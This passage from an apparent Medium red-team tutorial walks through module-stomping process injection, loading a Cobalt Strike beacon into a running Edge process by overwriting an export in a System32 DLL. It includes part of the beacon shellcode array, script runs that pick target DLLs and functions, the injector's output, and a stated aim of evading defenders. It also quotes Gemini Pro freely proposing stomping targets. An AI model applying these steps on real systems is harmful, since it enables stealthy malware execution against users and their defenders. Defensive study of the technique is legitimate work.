Since we’re targeted Edge in this example, we will use a Cobalt Strike Stageless Beacon using an HTTPS listener, which should help with blending our traffic in.

![](https://miro.medium.com/v2/resize:fit:399/1*wplQkekUeul3WHVv1MHPUA.png)

Note the total payload size:

```
PS C:\Users\Administrator > dir c:\payloads

    Directory: C:\payloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/2/2026   1:55 AM         287930 beacon_x64.bin

PS C:\Users\Administrator >
```

Update remote-stomp.cpp with our C2 buffer to replace the example Metasploit Win32 Calc payload.

To acccomodate the size of a full Beacon, we’ll refactor our buf array from **string literal initialization** to a **braced initializer list**.

```
unsigned char buf[] = {
    0x48, 0x89, 0x5c, 0x24, 0x18, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
    0x48, 0x8d, 0xac, 0x24, 0x10, 0xf3, 0xff, 0xff, 0x48, 0x81, 0xec, 0xf0, 0x0d, 0x00, 0x00, 0xe8,
    0x94, 0x0e, 0x00, 0x00, 0x48, 0x8b, 0xd8, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x33, 0xc0, 0x33, 0xd2,
    0x44, 0x8b, 0xf8, 0x44, 0x8b, 0xf0, 0x8b, 0xf8, 0x44, 0x8b, 0xe0, 0x44, 0x8d, 0x40, 0x10, 0xe8,
```

### **Step Four: Identify Candidate DLLs**

Run `find-stompable-dlls.py` to recursively scan `c:\Windows\System32` and its subdirectories, locating and filtering modules that match the `msedge-module-recon.txt` target list and meet the minimum payload size requirement.

```
windows-process-injection\module-stomping>python find-stompable-dlls.py -d c:\Windows\System32 -i c:\Payloads\msedge-module-recon.txt 287930
[*] Loading INCLUDE_MODULES from: 'c:\Payloads\msedge-module-recon.txt'
[+] Loaded 142 modules into INCLUDE_MODULES filter.
[*] Scanning Target Directory: 'c:\Windows\System32'
[*] Filtering for Files      : > 1.0MB
[*] Required .text Space     : 0x464ba bytes
[*] Targeted Include Filter  : Active (142 specific targets allowed)
--------------------------------------------------------------------------------------------------------------------------------------------
Full File Path                                                                        | File Size (MB)  | Size of .text   | Virtual Address
--------------------------------------------------------------------------------------------------------------------------------------------
c:\Windows\System32\AppXDeploymentClient.dll                                          | 1.45            | 0xe89d0         | 0x1000
c:\Windows\System32\combase.dll                                                       | 3.54            | 0x269ca2        | 0x1000
c:\Windows\System32\CoreMessaging.dll                                                 | 1.17            | 0xd1175         | 0x1000
c:\Windows\System32\CoreUIComponents.dll                                              | 2.89            | 0x19bf50        | 0x1000
c:\Windows\System32\crypt32.dll                                                       | 1.46            | 0x124e7b        | 0x1000
c:\Windows\System32\dnsapi.dll                                                        | 1.18            | 0xc64cc         | 0x1000
c:\Windows\System32\DWrite.dll                                                        | 2.37            | 0x192c3c        | 0x1000
c:\Windows\System32\gdi32full.dll                                                     | 1.18            | 0xb32bc         | 0x1000
c:\Windows\System32\iertutil.dll                                                      | 2.79            | 0x89445         | 0x1000
c:\Windows\System32\InputHost.dll                                                     | 1.91            | 0x154873        | 0x1000
c:\Windows\System32\KernelBase.dll                                                    | 3.94            | 0x1a392f        | 0x1000
c:\Windows\System32\msctf.dll                                                         | 1.38            | 0x114f70        | 0x1000
c:\Windows\System32\ntdll.dll                                                         | 2.41            | 0x16ae9c        | 0x1000
c:\Windows\System32\ole32.dll                                                         | 1.61            | 0xd5c4c         | 0x1000
c:\Windows\System32\PCPKsp.dll                                                        | 1.10            | 0xc68e6         | 0x1000
c:\Windows\System32\propsys.dll                                                       | 1.03            | 0xaa73e         | 0x1000
c:\Windows\System32\rpcrt4.dll                                                        | 1.11            | 0xd3e99         | 0x1000
c:\Windows\System32\setupapi.dll                                                      | 4.58            | 0xebc1e         | 0x1000
c:\Windows\System32\shell32.dll                                                       | 7.37            | 0x5aa034        | 0x1000
c:\Windows\System32\TextInputFramework.dll                                            | 1.30            | 0xf8d0c         | 0x1000
c:\Windows\System32\twinapi.appcore.dll                                               | 2.28            | 0x196efa        | 0x1000
c:\Windows\System32\ucrtbase.dll                                                      | 1.31            | 0xf5f61         | 0x1000
c:\Windows\System32\user32.dll                                                        | 1.79            | 0xa7fee         | 0x1000
c:\Windows\System32\Windows.Media.dll                                                 | 6.57            | 0x4a0eec        | 0x1000
c:\Windows\System32\Windows.Security.Authentication.Web.Core.dll                      | 1.21            | 0xe4f35         | 0x1000
c:\Windows\System32\windows.storage.dll                                               | 8.43            | 0x64cc4e        | 0x1000
c:\Windows\System32\Windows.System.Launcher.dll                                       | 1.49            | 0x113867        | 0x1000
c:\Windows\System32\Windows.UI.dll                                                    | 1.34            | 0xcd5ac         | 0x1000
c:\Windows\System32\Windows.UI.Immersive.dll                                          | 1.31            | 0xee404         | 0x1000
c:\Windows\System32\winhttp.dll                                                       | 1.17            | 0xd742c         | 0x1000
c:\Windows\System32\WinTypes.dll                                                      | 1.43            | 0xa1318         | 0x1000
c:\Windows\System32\wpnapps.dll                                                       | 1.35            | 0xc781c         | 0x1000
c:\Windows\System32\downlevel\ucrtbase.dll                                            | 1.31            | 0xf559c         | 0x1000
c:\Windows\System32\Microsoft-Edge-WebView\ffmpeg.dll                                 | 2.94            | 0x25bebc        | 0x1000
c:\Windows\System32\Microsoft-Edge-WebView\msedge.dll                                 | 287.75          | 0xeaf62f8       | 0x1000
c:\Windows\System32\Microsoft-Edge-WebView\msedge_elf.dll                             | 3.88            | 0x303af5        | 0x1000
c:\Windows\System32\Microsoft-Edge-WebView\oneauth.dll                                | 5.55            | 0x38d33e        | 0x1000
c:\Windows\System32\Microsoft-Edge-WebView\oneds.dll                                  | 3.12            | 0x22aaab        | 0x1000
c:\Windows\System32\Microsoft-Edge-WebView\telclient.dll                              | 2.50            | 0x1e4413        | 0x1000
--------------------------------------------------------------------------------------------------------------------------------------------
[*] Found 39 potential candidates matching the criteria.

windows-process-injection\module-stomping>
```

From the results, select an appropriate target module for stomping. AI can help summarize each module’s purpose for additional context. **Gemini Pro** was happy to **suggest stomping targets** and even categorized them for me. Here is a sample of the response:

_Here are the best modules from your specific list to target next, grouped by their architectural role:_

**_1\. The Media & Graphics Tier (Highest Stability)_**

_Like ffmpeg.dll, these modules support specific multimedia or rendering subsets. If the active tab isn’t explicitly using those specific features, the export table is completely quiet._

- **_c:\\Windows\\System32\\DWrite.dll_** _(Size of .text: 0x192c3c)_
- **_What it is:_** _Microsoft DirectWrite (font and text layout engine)._
- **_Why it’s a great test:_** _While it handles font rendering, it is packed with complex multi-language script layout functions (e.g., historical font features, advanced OpenType layout boundaries) that are rarely used on standard English websites._
- **_c:\\Windows\\System32\\Windows.UI.Immersive.dll_** _(Size of .text: 0xee404)_
- **_What it is:_** _The framework responsible for modern WinRT/UWP UI components, notifications, and shell integration._
- **_Why it’s a great test:_** _Inside a Chromium-based browser, the actual web page rendering engine completely bypasses this DLL. It is typically only hit for Windows-native features like toast notifications or window snip transitions, leaving many of its secondary exports completely uninvoked._

### **Step Five: Identify Target Function**

With a viable module selected, the next phase requires zeroing in on a specific entry point within its export table. Run `dump-exports.py` to parse the module's Portable Executable (PE) headers, specifically dumping the Export Address Table (EAT). This tool enumerates all exported function names along with their relative virtual addresses (RVAs) and ordinal values.

```
windows-process-injection\module-stomping>python dump-exports.py -f c:\Windows\System32\Microsoft-Edge-WebView\ffmpeg.dll

===============================================================================================
📦 EXPORT ADDRESS TABLE MANIFEST: ffmpeg.dll
===============================================================================================
Exported Symbol / Function Name                         | Ordinal    | Relative Virtual Address (RVA)
-----------------------------------------------------------------------------------------------
avcodec_find_decoder                                    | 37         | 0x5ea90
avcodec_open2                                           | 41         | 0x61150
avcodec_flush_buffers                                   | 38         | 0x61700
avcodec_receive_frame                                   | 43         | 0x62090
avcodec_descriptor_get                                  | 35         | 0x62db0
avcodec_descriptor_next                                 | 36         | 0x62e30
avcodec_parameters_to_context                           | 42         | 0x63420
avcodec_send_packet                                     | 44         | 0x65670
avcodec_alloc_context3                                  | 34         | 0x16e760
avcodec_free_context                                    | 39         | 0x16e900
av_init_packet                                          | 16         | 0x16f410
av_packet_alloc                                         | 21         | 0x16f460
av_packet_free                                          | 23         | 0x16f4c0
av_packet_unref                                         | 25         | 0x16f590
av_new_packet                                           | 20         | 0x16f630
av_packet_get_side_data                                 | 24         | 0x16f9d0
av_packet_copy_props                                    | 22         | 0x16fba0
avcodec_align_dimensions                                | 33         | 0x172360
avcodec_get_name                                        | 40         | 0x172430
avformat_alloc_context                                  | 45         | 0x17b120
av_stream_get_first_dts                                 | 31         | 0x17ba20
avformat_free_context                                   | 48         | 0x17c610
avio_close                                              | 51         | 0x17db00
avio_alloc_context                                      | 50         | 0x17dcc0
avformat_open_input                                     | 49         | 0x180350
avformat_close_input                                    | 46         | 0x180940
av_read_frame                                           | 26         | 0x1812b0
avformat_find_stream_info                               | 47         | 0x182700
av_seek_frame                                           | 29         | 0x1ab8b0
av_force_cpu_flags                                      | 7          | 0x1aea70
av_get_cpu_flags                                        | 14         | 0x1aea90
av_image_check_size                                     | 15         | 0x1af490
av_buffer_create                                        | 1          | 0x1bbf20
av_buffer_get_opaque                                    | 2          | 0x1bc160
av_dict_count                                           | 3          | 0x1bf060
av_dict_get                                             | 5          | 0x1bf0a0
av_dict_set                                             | 6          | 0x1bf240
av_dict_free                                            | 4          | 0x1bf6c0
av_strerror                                             | 32         | 0x1c0110
av_frame_alloc                                          | 8          | 0x1c35d0
av_frame_free                                           | 10         | 0x1c3660
av_frame_unref                                          | 11         | 0x1c3690
av_frame_clone                                          | 9          | 0x1c4740
av_log_set_level                                        | 17         | 0x1c5fc0
av_rescale_q                                            | 27         | 0x1c62f0
av_max_alloc                                            | 19         | 0x1c6740
av_malloc                                               | 18         | 0x1c6750
av_free                                                 | 12         | 0x1c6820
av_strdup                                               | 30         | 0x1c6a90
av_get_bytes_per_sample                                 | 13         | 0x1cc2b0
av_samples_get_buffer_size                              | 28         | 0x1cc2f0
-----------------------------------------------------------------------------------------------
[+] Successfully extracted 51 exports from the EAT.
===============================================================================================

windows-process-injection\module-stomping>
```

When reviewing the output, look for a function that serves as an ideal base pointer for the target buffer. Ideally, you want to select a function that is rarely or never invoked during the target process’s normal execution loop to prevent premature instability before initialization is complete. Once identified, this export name or its specific RVA will define the exact starting offset where the payload buffer will be committed.

### **Step Six: Evaluate Blast Radius**

Once you have selected your **target function** entry point, you must determine the structural consequences of the write operation. Run `blast-radius.py` to calculate the spatial impact of committing your total payload size beginning at that chosen export pointer.

```
windows-process-injection\module-stomping>python blast-radius.py -f c:\Windows\System32\Microsoft-Edge-WebView\ffmpeg.dll -fnc avcodec_open2 -s 287930

==========================================================================================
💥 MODULE STOMP BLAST RADIUS ANALYSIS: ffmpeg.dll
==========================================================================================
Target Function       : avcodec_open2
Target Function RVA   : 0x61150
Your Payload Size     : 287930 bytes (0x464ba)
Isolated Exec Space   : 1456 bytes (0x5b0)
------------------------------------------------------------------------------------------
🔴 STATUS: [OVERFLOW RISK / COLLATERAL DAMAGE]
Your payload overflows the isolated function boundary by 286474 bytes.
Total adjacent exports completely or partially overwritten: 6

🚨 Overwritten Functions List:
  Offset From Target     | Function Name                                 | Start RVA
  -------------------------------------------------------------------------------------
  +1456                 | avcodec_flush_buffers                         | 0x61700
  +3904                 | avcodec_receive_frame                         | 0x62090
  +7264                 | avcodec_descriptor_get                        | 0x62db0
  +7392                 | avcodec_descriptor_next                       | 0x62e30
  +8912                 | avcodec_parameters_to_context                 | 0x63420
  +17696                | avcodec_send_packet                           | 0x65670
==========================================================================================

windows-process-injection\module-stomping>
```

### Execute Module Stomping and Payload Delivery

With absolute tracking of the target module, target function and calculated blast radius finalized, we are ready to orchestrate the actual injection sequence. This phase shifts from passive reconnaissance to active memory manipulation.

The injection engine targets the remote process context. The loader overwrites the targeted function pointer with the payload buffer. Because we precisely verified the offset space using `blast-radius.py`, the payload occupies the designated code space without bleeding into unverified pages or triggering memory access violations.

Once the stomp is complete, a new thread is started using the modified entry point. Since the payload hides out inside the legitimate, file-backed memory of a trusted system DLL, it won’t trigger the usual red flags for strange, unbacked memory, giving us clean, stable execution without tripping any alarms.

```
windows-process-injection\module-stomping>remote-stomp.exe 3896 ffmpeg.dll avcodec_open2
[*] Running PI with target PID: 3896
[*] Successfully opened handle to PID: 3896
[*] Target PEB located at: : 0x000000df3b5e3000
[*] Attempting to locate the module base for ffmpeg.dll.
[*] Target DLL base located at: : 0x00007ffda9e00000
[*] Target ffmpeg.dll!avcodec_open2 located at: 0x00007ffda9e5d050
[*] Press Enter to write the shellcode to the buffer address: <Enter>
[*] Writing to buffer.
[*] Creating a new thread.
[*] Process injection complete.

windows-process-injection\module-stomping>
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*R1bDRAolAKWw06dHy7wswA.png)

Cobalt Strike, terminal and the target process (Edge)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*sEuQI9SVpP8RKgk89R-Mqg.png)

Console output

## Conclusion

The era of treating advanced evasion techniques as “plug-and-play” scripts is over. Forcing a process to map noisy, unbacked memory segments or sacrificial libraries will almost always land you at the top of a modern defender’s alert queue.

The workflow outlined here proves that stability and stealth are achieved through meticulous environmental planning. By taking the time to profile the target process, audit export tables, and accurately calculate your blast radius before writing a single byte to memory, you ensure your execution remains clean, stable, and completely blended into legitimate system routines.

## Next Steps

- **Automating the Hunt:** Leveraging an automated test harness to systematically hunt for dormant, uninvoked code sections across heavy application suites.

## References

**An Introduction to Module Stomping: Overwriting DLLs for Windows Process Injection** [https://medium.com/@toneillcodes/an-introduction-to-module-stomping-26238af76d43](https://medium.com/@toneillcodes/an-introduction-to-module-stomping-26238af76d43)

**@toneillcodes Windows Process Injection Repository** [https://github.com/toneillcodes/windows-process-injection/](https://github.com/toneillcodes/windows-process-injection/)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----b51feb0978fe---------------------------------------)

[Red Team](https://medium.com/tag/red-team?source=post_page-----b51feb0978fe---------------------------------------)

[Malware](https://medium.com/tag/malware?source=post_page-----b51feb0978fe---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----b51feb0978fe---------------------------------------)

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:48:48/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---post_author_info--b51feb0978fe---------------------------------------)

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:64:64/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---post_author_info--b51feb0978fe---------------------------------------)

Follow

[**Written by Tom O'Neill**](https://medium.com/@toneillcodes?source=post_page---post_author_info--b51feb0978fe---------------------------------------)

[50 followers](https://medium.com/@toneillcodes/followers?source=post_page---post_author_info--b51feb0978fe---------------------------------------)

· [25 following](https://medium.com/@toneillcodes/following?source=post_page---post_author_info--b51feb0978fe---------------------------------------)

Independent Security Researcher

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----b51feb0978fe---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----b51feb0978fe---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----b51feb0978fe---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----b51feb0978fe---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----b51feb0978fe---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----b51feb0978fe---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----b51feb0978fe---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----b51feb0978fe---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----b51feb0978fe---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**